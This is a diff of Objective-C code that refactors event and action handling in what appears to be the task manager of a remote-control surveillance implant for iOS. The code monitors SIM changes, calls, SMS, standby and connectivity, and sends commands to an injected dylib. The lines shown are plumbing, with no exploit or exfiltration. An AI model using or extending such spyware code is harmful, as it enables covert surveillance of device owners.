     {
       NSAutoreleasePool *innerPool = [[NSAutoreleasePool alloc] init];
       
-      switch ([[anObject threadSafeObjectForKey: @"type"
+      switch ([[theEvent threadSafeObjectForKey: @"type"
                                       usingLock: gTaskManagerLock] intValue])
         {
         case EVENT_TIMER:
           {
-#ifdef DEBUG
-            NSLog(@"EVENT TIMER FOUND! Starting monitor Thread");
-#endif
-            RCSIEvents *events = [RCSIEvents sharedEvents];
-            [NSThread detachNewThreadSelector: @selector(eventTimer:)
-                                     toTarget: events
-                                   withObject: anObject];
+            // timers with NSTimer
+            [events addEventTimerInstance: theEvent];
             break;
           }
         case EVENT_PROCESS:
           {
-#ifdef DEBUG
-            NSLog(@"EVENT Process FOUND! Starting monitor Thread");
-#endif
-            RCSIEvents *events = [RCSIEvents sharedEvents];
-            [NSThread detachNewThreadSelector: @selector(eventProcess:)
-                                     toTarget: events
-                                   withObject: anObject];
+            [events addEventProcessInstance: theEvent];
             break;
           }
         case EVENT_CONNECTION:
           {
-#ifdef DEBUG
-            NSLog(@"EVENT Connection FOUND! Starting monitor Thread");
-#endif
-            RCSIEvents *events = [RCSIEvents sharedEvents];
-            [NSThread detachNewThreadSelector: @selector(eventConnection:)
-                                     toTarget: events
-                                   withObject: anObject];
-           break; 
-          }
-        case EVENT_QUOTA:
-          {
-            break;
+            [events addEventConnectivityInstance:theEvent];
+            break; 
           }
         case EVENT_BATTERY:
           {
-            RCSIEvents *events = [RCSIEvents sharedEvents];
-            RCSINotificationCenter *center = [RCSINotificationCenter sharedInstance];
-            [center addNotificationObject: (id) events withEvent: BATTERY_CT_EVENT];
+            [events addEventBatteryInstance:theEvent];
             break;
           }
-        case EVENT_SMS:
+        case EVENT_AC:
           {
-            RCSIEvents *events = [RCSIEvents sharedEvents];
-            RCSINotificationCenter *center = [RCSINotificationCenter sharedInstance];
-            [center addNotificationObject: (id) events withEvent: SMS_CT_EVENT];
-            break;
-          }
-        case EVENT_CALL:
-          {
-            RCSIEvents *events = [RCSIEvents sharedEvents];
-            RCSINotificationCenter *center = [RCSINotificationCenter sharedInstance];
-            [center addNotificationObject: (id) events withEvent: CALL_CT_EVENT];
-            break;
-          }
-        case EVENT_SIM_CHANGE:
-          {
-            RCSIEvents *events = [RCSIEvents sharedEvents];
-            RCSINotificationCenter *center = [RCSINotificationCenter sharedInstance];
-            [center addNotificationObject: (id) events withEvent: SIM_CT_EVENT];
+            [events addEventACInstance:theEvent];
             break;
           }
         case EVENT_STANDBY:
           {
-            RCSIEvents *events = [RCSIEvents sharedEvents];
-            [NSThread detachNewThreadSelector: @selector(eventStandBy:)
-                                     toTarget: events
-                                   withObject: anObject];
+#ifdef JSON_CONFIG
+            [events addEventScreensaverInstance:theEvent];
+            [events startEventStandBy: eventPos];
+#else
+            // start remote events (triggered in SBApplication)
+            [events eventStandBy: theEvent];
+#endif
+            break;
+          }
+        case EVENT_SIM_CHANGE:
+          {
+#ifdef JSON_CONFIG
+            [events addEventSimChangeInstance:theEvent];
+#else
+            // start remote events (triggered in SBApplication)
+            [events eventSimChange:theEvent];
+#endif
+            break;
+          }
+        case EVENT_SMS:
+          {
+            break;
+          }
+        case EVENT_CALL:
+          {
+              break;
+          }
+        case EVENT_QUOTA:
+          {
             break;
           }
         default:
@@ -2173,59 +1788,63 @@ extern RCSISharedMemory *mSharedMemoryCommand;
           }
         }
       
+      eventPos++;
+      
       [innerPool release];
     }
-  
+
   [outerPool release];
+  
+  return TRUE;
 }
 
 - (BOOL)stopEvents
 {
   id anObject;
-  
+#ifndef JSON_CONFIG
   int counter   = 0;
+#endif
   int errorFlag = 0;
   
   for (anObject in mEventsList)
     {
+      // set local status flag... 
       [anObject setValue: EVENT_STOP forKey: @"status"];
     
+      // stop remote events monitors and set manually status flag...
       switch ([[anObject threadSafeObjectForKey: @"type"
                                       usingLock: gTaskManagerLock] intValue])
         {
-          case EVENT_BATTERY:
-          {
-            RCSIEvents *events = [RCSIEvents sharedEvents];
-            RCSINotificationCenter *center = [RCSINotificationCenter sharedInstance];
-            [center removeNotificationObject: (id) events withEvent: BATTERY_CT_EVENT];
-            [anObject setValue: EVENT_STOPPED forKey: @"status"];
-            break;
-          }
-          case EVENT_SMS:
-          {
-            RCSIEvents *events = [RCSIEvents sharedEvents];
-            RCSINotificationCenter *center = [RCSINotificationCenter sharedInstance];
-            [center removeNotificationObject: (id) events withEvent: SMS_CT_EVENT];
-            [anObject setValue: EVENT_STOPPED forKey: @"status"];
-            break;
-          }
-          case EVENT_CALL:
-          {
-            RCSIEvents *events = [RCSIEvents sharedEvents];
-            RCSINotificationCenter *center = [RCSINotificationCenter sharedInstance];
-            [center removeNotificationObject: (id) events withEvent: CALL_CT_EVENT];
-            [anObject setValue: EVENT_STOPPED forKey: @"status"];
-            break;
-          }
-          case EVENT_CONNECTION:
-          {
-            break;
-          }
           case EVENT_SIM_CHANGE:
           {
-            RCSIEvents *events = [RCSIEvents sharedEvents];
-            RCSINotificationCenter *center = [RCSINotificationCenter sharedInstance];
-            [center removeNotificationObject: (id) events withEvent: SIM_CT_EVENT];
+            // 
+            NSMutableData *simChangeComm = [[NSMutableData alloc] initWithLength: sizeof(shMemoryCommand)];
+            
+            shMemoryCommand *shMemoryHeader = (shMemoryCommand *)[simChangeComm bytes];
+            shMemoryHeader->agentID         = OFFT_SIMCHG;
+            shMemoryHeader->direction       = D_TO_AGENT;
+            shMemoryHeader->command         = AG_STOP;
+            shMemoryHeader->commandDataSize = 0;
+            
+            memset(shMemoryHeader->commandData, 0, sizeof(shMemoryHeader->commandData));
+            
+            if ([mSharedMemoryCommand writeMemory: simChangeComm
+                                           offset: OFFT_SIMCHG
+                                    fromComponent: COMP_CORE])
+              {
+#ifdef DEBUG
+                NSLog(@"%s: sending simchange command to dylib: done!", __FUNCTION__);
+#endif
+              }
+            else 
+              {
+#ifdef DEBUG
+                NSLog(@"%s: sending simchange command to dylib: error!", __FUNCTION__);
+#endif
+              }
+            
+            [simChangeComm release]; 
+            
             [anObject setValue: EVENT_STOPPED forKey: @"status"];
             break;
           }
@@ -2241,11 +1860,7 @@ extern RCSISharedMemory *mSharedMemoryCommand;
             shMemoryHeader->commandDataSize = 0;
             
             memset(shMemoryHeader->commandData, 0, sizeof(shMemoryHeader->commandData));
-            
-#ifdef DEBUG
-            NSLog(@"%s: sending standby command to dylib", __FUNCTION__);
-#endif
-            
+   
             if ([mSharedMemoryCommand writeMemory: standByCommand
                                            offset: OFFT_STANDBY
                                     fromComponent: COMP_CORE])
@@ -2262,10 +1877,14 @@ extern RCSISharedMemory *mSharedMemoryCommand;
             }
             
             [standByCommand release]; 
+            [anObject setValue: EVENT_STOPPED forKey: @"status"];
             break;
           }
         }
-    
+#ifdef JSON_CONFIG
+      //do nothing: events are timers... status stopped in [eventManager stop]
+#else    
+      // wait for threads monitor events exit
       while ([anObject objectForKey: @"status"] != EVENT_STOPPED
              && counter <= MAX_WAIT_TIME)
         {
@@ -2273,10 +1892,12 @@ extern RCSISharedMemory *mSharedMemoryCommand;
           counter++;
         }
       
+      // checking the timeout: there are possibile monitor thread already running
       if (counter == MAX_WAIT_TIME)
         errorFlag = 1;
       
       counter = 0;
+#endif
     }
   
   if (errorFlag == 0)
@@ -2285,11 +1906,10 @@ extern RCSISharedMemory *mSharedMemoryCommand;
     return FALSE;
 }
 
-
-- (BOOL)startEvents
+- (BOOL)startEventsMonitors
 {
   // Start events monitoring thread
-  [NSThread detachNewThreadSelector: @selector(eventsMonitor)
+  [NSThread detachNewThreadSelector: @selector(startEvents)
                            toTarget: self
                          withObject: nil];
   return TRUE;
@@ -2306,7 +1926,6 @@ extern RCSISharedMemory *mSharedMemoryCommand;
 #endif
   
   NSArray *configArray = [self getConfigForAction: anActionID];
-  //NSMutableDictionary *configuration = [self getConfigForAction: anActionID];
   NSMutableDictionary *configuration;
   
 #ifdef DEBUG
@@ -2349,7 +1968,7 @@ extern RCSISharedMemory *mSharedMemoryCommand;
 #endif
         case ACTION_SYNC:
           {
-#ifdef DEBUG
+#ifdef DEBUG_
             NSLog(@"Starting action Sync");
 #endif
 
@@ -2381,7 +2000,7 @@ extern RCSISharedMemory *mSharedMemoryCommand;
 
             if ([[configuration objectForKey: @"status"] intValue] == 0)
               {
-#ifdef DEBUG
+#ifdef DEBUG_
                 NSLog(@"AGENT START");
 #endif
 
@@ -2419,7 +2038,7 @@ extern RCSISharedMemory *mSharedMemoryCommand;
           }
         case ACTION_INFO:
           {
-#ifdef DEBUG
+#ifdef DEBUG_
             NSLog(@"Starting info action");
 #endif
             if ([[configuration objectForKey: @"status"] intValue] == 0)
@@ -2436,7 +2055,7 @@ extern RCSISharedMemory *mSharedMemoryCommand;
           }
         default:
           {
-#ifdef DEBUG
+#ifdef DEBUG_
             NSLog(@"Unknown actionID (%d)", type);
 #endif
             break;
@@ -2486,7 +2105,11 @@ extern RCSISharedMemory *mSharedMemoryCommand;
   NSDictionary *dictionary = [NSDictionary dictionaryWithObjects: objects
                                                          forKeys: keys];
   [eventConfiguration addEntriesFromDictionary: dictionary];
-  [mEventsList addObject: eventConfiguration];
+  
+  @synchronized(self)
+  {
+    [mEventsList addObject: eventConfiguration];
+  }
   
   return YES;
 }
@@ -2606,7 +2229,21 @@ extern RCSISharedMemory *mSharedMemoryCommand;
 #pragma mark -
 
 - (NSArray *)getConfigForAction: (u_int)anActionID
-{
+{  
+#ifdef  JSON_CONFIG  
+#define ACTION_SUBACT_KEY @"subactions"  
+  
+  NSArray *subactions;
+
+  @synchronized(self)
+  {
+    NSDictionary *subaction = [mActionsList objectAtIndex:anActionID];
+    subactions = [[[subaction objectForKey: ACTION_SUBACT_KEY] retain] autorelease];
+  }
+
+  return subactions;
+  
+#else
   NSMutableArray *configArray = [[NSMutableArray alloc] init];
   NSMutableDictionary *anObject;
   
@@ -2616,14 +2253,12 @@ extern RCSISharedMemory *mSharedMemoryCommand;
                                   usingLock: gTaskManagerLock]
            unsignedIntValue] == anActionID)
         {
-#ifdef DEBUG
-          NSLog(@"Action %d found", anActionID);
-#endif
           [configArray addObject: anObject];
         }
     }
   
   return [configArray autorelease];
+#endif
 }
 
 - (NSMutableDictionary *)getConfigForAgent: (u_int)anAgentID
@@ -2654,11 +2289,28 @@ extern RCSISharedMemory *mSharedMemoryCommand;
   return nil;
 }
 
+// EventsManager, ConfManager get copy of the running
+// list and retain it til used
+- (NSMutableArray*)getCopyOfEvents
+{
+  NSMutableArray *events = nil;
+  
+  @synchronized(self)
+  {
+    events = [mEventsList copy];
+  }
+  
+  return events;
+}
+
 - (void)removeAllElements
 {
-  [mEventsList removeAllObjects];
-  [mActionsList removeAllObjects];
-  [mAgentsList removeAllObjects];
+  @synchronized(self)
+  {
+    [mEventsList removeAllObjects];
+    [mActionsList removeAllObjects];
+    [mAgentsList removeAllObjects];
+  }
 }
 
 @end
